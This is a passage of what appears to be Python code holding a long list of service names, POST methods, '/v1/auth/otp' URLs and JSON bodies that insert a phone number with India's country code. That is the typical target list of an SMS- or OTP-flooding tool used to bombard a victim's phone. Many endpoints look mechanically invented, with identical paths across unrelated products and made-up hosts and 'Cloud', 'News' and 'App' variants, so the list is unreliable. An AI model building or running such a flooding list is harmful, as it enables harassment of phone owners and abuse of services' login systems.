    ("Hugo","POST","https://api.hugo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Gatsby","POST","https://api.gatsby.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NextJS","POST","https://api.nextjs.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Nuxt","POST","https://api.nuxt.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SvelteKit","POST","https://api.sveltekit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Astro","POST","https://api.astro.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("VuePress","POST","https://api.vuepress.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Docsify","POST","https://api.docsify.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("GitBook","POST","https://api.gitbook.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Notion","POST","https://api.notion.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Obsidian","POST","https://api.obsidian.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RoamResearch","POST","https://api.roamresearch.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Logseq","POST","https://api.logseq.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TiddlyWiki","POST","https://api.tiddlywiki.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zettlr","POST","https://api.zettlr.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Trilium","POST","https://api.trilium.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Anytype","POST","https://api.anytype.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Craft","POST","https://api.craft.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bear","POST","https://api.bear.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Ulysses","POST","https://api.ulysses.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Scrivener","POST","https://api.scrivener.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Typora","POST","https://api.typora.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MarkText","POST","https://api.marktext.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zettlr Cloud","POST","https://api.zettlrcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Notable","POST","https://api.notable.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Boostnote","POST","https://api.boostnote.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Caret","POST","https://api.caret.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Ghostwriter","POST","https://api.ghostwriter.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("QOwnNotes","POST","https://api.qownnotes.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CherryTree","POST","https://api.cherrytree.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TreePad","POST","https://api.treepad.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("KeyNote NF","POST","https://api.keynotenf.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Tomboy","POST","https://api.tomboy.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Gnote","POST","https://api.gnote.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RedNotebook","POST","https://api.rednotebook.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("LifePIM","POST","https://api.lifepim.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("EssentialPIM","POST","https://api.essentialpim.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MyLifeOrganized","POST","https://api.mylifeorganized.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Todoist","POST","https://api.todoist.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TickTick","POST","https://api.ticktick.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MS ToDo","POST","https://api.todo.microsoft.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Google Tasks","POST","https://api.tasks.google.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Wunderlist","POST","https://api.wunderlist.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("AnyDo","POST","https://api.anydo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RememberTheMilk","POST","https://api.rememberthemilk.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Toodledo","POST","https://api.toodledo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Evernote","POST","https://api.evernote.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("OneNote","POST","https://api.onenote.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Apple Notes","POST","https://api.notes.apple.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Google Keep","POST","https://api.keep.google.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Simplenote","POST","https://api.simplenote.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("StandardNotes","POST","https://api.standardnotes.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Joplin","POST","https://api.joplin.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Laverna","POST","https://api.laverna.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Turtl","POST","https://api.turtl.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Paperwork","POST","https://api.paperwork.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TagSpaces","POST","https://api.tagspaces.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("QOwnNotes Cloud","POST","https://api.qownnotescloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CherryTree Cloud","POST","https://api.cherrytreecloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TreePad Cloud","POST","https://api.treepadcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("KeyNote Cloud","POST","https://api.keynotecloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Tomboy Cloud","POST","https://api.tomboycloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Gnote Cloud","POST","https://api.gnotecloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RedNotebook Cloud","POST","https://api.rednotebookcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("LifePIM Cloud","POST","https://api.lifepimcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("EssentialPIM Cloud","POST","https://api.essentialpimcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MyLifeOrganized Cloud","POST","https://api.mylifeorganizedcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Todoist Cloud","POST","https://api.todoistcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TickTick Cloud","POST","https://api.ticktickcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MS ToDo Cloud","POST","https://api.todomicrosoftcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Google Tasks Cloud","POST","https://api.tasksgooglecloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Wunderlist Cloud","POST","https://api.wunderlistcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("AnyDo Cloud","POST","https://api.anydocloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RememberTheMilk Cloud","POST","https://api.rememberthemilkcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Toodledo Cloud","POST","https://api.toodledocloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Evernote Cloud","POST","https://api.evernotecloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("OneNote Cloud","POST","https://api.onenotecloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Apple Notes Cloud","POST","https://api.notesapplecloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Google Keep Cloud","POST","https://api.keepgooglecloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Simplenote Cloud","POST","https://api.simplenotecloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("StandardNotes Cloud","POST","https://api.standardnotescloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Joplin Cloud","POST","https://api.joplincloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Laverna Cloud","POST","https://api.lavernacloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Turtl Cloud","POST","https://api.turtlcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Paperwork Cloud","POST","https://api.paperworkcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TagSpaces Cloud","POST","https://api.tagspacescloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Miro","POST","https://api.miro.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mural","POST","https://api.mural.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Lucidspark","POST","https://api.lucidspark.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Stormboard","POST","https://api.stormboard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Conceptboard","POST","https://api.conceptboard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Sketchboard","POST","https://api.sketchboard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mindmeister","POST","https://api.mindmeister.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mindomo","POST","https://api.mindomo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("XMind","POST","https://api.xmind.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Coggle","POST","https://api.coggle.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Lucidchart","POST","https://api.lucidchart.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SmartDraw","POST","https://api.smartdraw.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Draw.io","POST","https://api.drawio.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Creately","POST","https://api.creately.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Gliffy","POST","https://api.gliffy.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Whimsical","POST","https://api.whimsical.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Scribblar","POST","https://api.scribblar.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Twiddla","POST","https://api.twiddla.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bubble","POST","https://api.bubble.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Adalo","POST","https://api.adalo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Glide","POST","https://api.glide.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("OutSystems","POST","https://api.outsystems.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mendix","POST","https://api.mendix.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("PowerApps","POST","https://api.powerapps.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Appian","POST","https://api.appian.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pega","POST","https://api.pega.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Salesforce Platform","POST","https://api.salesforceplatform.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ServiceNow Platform","POST","https://api.servicenowplatform.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zoho Creator","POST","https://api.zohocreator.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Airtable","POST","https://api.airtable.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Smartsheet","POST","https://api.smartsheet.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Monday","POST","https://api.monday.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ClickUp","POST","https://api.clickup.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Asana","POST","https://api.asana.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Trello","POST","https://api.trello.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Jira","POST","https://api.jira.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Confluence","POST","https://api.confluence.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Basecamp","POST","https://api.basecamp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Teamwork","POST","https://api.teamwork.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Wrike","POST","https://api.wrike.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Podio","POST","https://api.podio.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Redmine","POST","https://api.redmine.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Taiga","POST","https://api.taiga.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MantisBT","POST","https://api.mantisbt.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bugzilla","POST","https://api.bugzilla.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("GitLab","POST","https://api.gitlab.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("GitHub","POST","https://api.github.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bitbucket","POST","https://api.bitbucket.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SourceForge","POST","https://api.sourceforge.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Codeberg","POST","https://api.codeberg.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Gitee","POST","https://api.gitee.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("GitKraken","POST","https://api.gitkraken.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Sourcetree","POST","https://api.sourcetree.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Fork","POST","https://api.fork.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Tower","POST","https://api.tower.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("GitExtensions","POST","https://api.gitextensions.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SmartGit","POST","https://api.smartgit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("GitCola","POST","https://api.gitcola.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("GitAhead","POST","https://api.gitahead.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("GitFinder","POST","https://api.gitfinder.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("WorkingCopy","POST","https://api.workingcopy.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CodeHub","POST","https://api.codehub.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Git2Go","POST","https://api.git2go.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pocket","POST","https://api.pocket.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Instapaper","POST","https://api.instapaper.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Readwise","POST","https://api.readwise.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Matter","POST","https://api.matter.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Feedly","POST","https://api.feedly.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Inoreader","POST","https://api.inoreader.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NewsBlur","POST","https://api.newsblur.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TheOldReader","POST","https://api.theoldreader.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NetNewsWire","POST","https://api.netnewswire.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Reeder","POST","https://api.reeder.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Fiery Feeds","POST","https://api.fieryfeeds.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Unread","POST","https://api.unread.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Lire","POST","https://api.lire.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ReadKit","POST","https://api.readkit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Vienna","POST","https://api.vienna.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RSSOwl","POST","https://api.rssowl.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("QuiteRSS","POST","https://api.quiterss.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Liferea","POST","https://api.liferea.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("FeedReader","POST","https://api.feedreader.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RSSBandit","POST","https://api.rssbandit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RSSGuard","POST","https://api.rssguard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("FluentReader","POST","https://api.fluentreader.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("GoodLinks","POST","https://api.goodlinks.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Curtail","POST","https://api.curtail.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Wallabag","POST","https://api.wallabag.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Shiori","POST","https://api.shiori.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("LinkAce","POST","https://api.linkace.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Raindrop","POST","https://api.raindrop.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BookmarkOS","POST","https://api.bookmarkos.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("StartMe","POST","https://api.startme.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Papaly","POST","https://api.papaly.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Booky","POST","https://api.booky.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Diigo","POST","https://api.diigo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Delicious","POST","https://api.delicious.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pinboard","POST","https://api.pinboard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ScoopIt","POST","https://api.scoopit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Paperli","POST","https://api.paperli.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Flipboard","POST","https://api.flipboard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SmartNews","POST","https://api.smartnews.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Google News","POST","https://api.news.google.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Apple News","POST","https://api.news.apple.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Yahoo News","POST","https://api.news.yahoo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MSN News","POST","https://api.news.msn.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("AOL News","POST","https://api.news.aol.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Reddit News","POST","https://api.news.reddit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Twitter News","POST","https://api.news.twitter.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Facebook News","POST","https://api.news.facebook.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("LinkedIn News","POST","https://api.news.linkedin.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pocket News","POST","https://api.news.pocket.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Instapaper News","POST","https://api.news.instapaper.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Readwise News","POST","https://api.news.readwise.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Matter News","POST","https://api.news.matter.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Feedly News","POST","https://api.news.feedly.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Inoreader News","POST","https://api.news.inoreader.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NewsBlur News","POST","https://api.news.newsblur.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TheOldReader News","POST","https://api.news.theoldreader.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NetNewsWire News","POST","https://api.news.netnewswire.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Reeder News","POST","https://api.news.reeder.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Fiery Feeds News","POST","https://api.news.fieryfeeds.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Unread News","POST","https://api.news.unread.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Lire News","POST","https://api.news.lire.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ReadKit News","POST","https://api.news.readkit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Vienna News","POST","https://api.news.vienna.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RSSOwl News","POST","https://api.news.rssowl.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("QuiteRSS News","POST","https://api.news.quiterss.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Liferea News","POST","https://api.news.liferea.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("FeedReader News","POST","https://api.news.feedreader.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RSSBandit News","POST","https://api.news.rssbandit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RSSGuard News","POST","https://api.news.rssguard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("FluentReader News","POST","https://api.news.fluentreader.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("GoodLinks News","POST","https://api.news.goodlinks.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Curtail News","POST","https://api.news.curtail.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Wallabag News","POST","https://api.news.wallabag.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Shiori News","POST","https://api.news.shiori.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("LinkAce News","POST","https://api.news.linkace.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Raindrop News","POST","https://api.news.raindrop.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BookmarkOS News","POST","https://api.news.bookmarkos.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("StartMe News","POST","https://api.news.startme.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Papaly News","POST","https://api.news.papaly.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Booky News","POST","https://api.news.booky.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Diigo News","POST","https://api.news.diigo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Delicious News","POST","https://api.news.delicious.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pinboard News","POST","https://api.news.pinboard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ScoopIt News","POST","https://api.news.scoopit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Paperli News","POST","https://api.news.paperli.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Flipboard News","POST","https://api.news.flipboard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SmartNews News","POST","https://api.news.smartnews.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Google News App","POST","https://api.news.googleapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Apple News App","POST","https://api.news.appleapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Yahoo News App","POST","https://api.news.yahooapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MSN News App","POST","https://api.news.msnapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("AOL News App","POST","https://api.news.aolapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Reddit News App","POST","https://api.news.redditapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Twitter News App","POST","https://api.news.twitterapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Facebook News App","POST","https://api.news.facebookapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("LinkedIn News App","POST","https://api.news.linkedinapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pocket News App","POST","https://api.news.pocketapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Instapaper News App","POST","https://api.news.instapaperapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Readwise News App","POST","https://api.news.readwiseapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Matter News App","POST","https://api.news.matterapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Feedly News App","POST","https://api.news.feedlyapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Inoreader News App","POST","https://api.news.inoreaderapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NewsBlur News App","POST","https://api.news.newsblurapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TheOldReader News App","POST","https://api.news.theoldreaderapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NetNewsWire News App","POST","https://api.news.netnewswireapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Reeder News App","POST","https://api.news.reederapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Fiery Feeds News App","POST","https://api.news.fieryfeedsapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
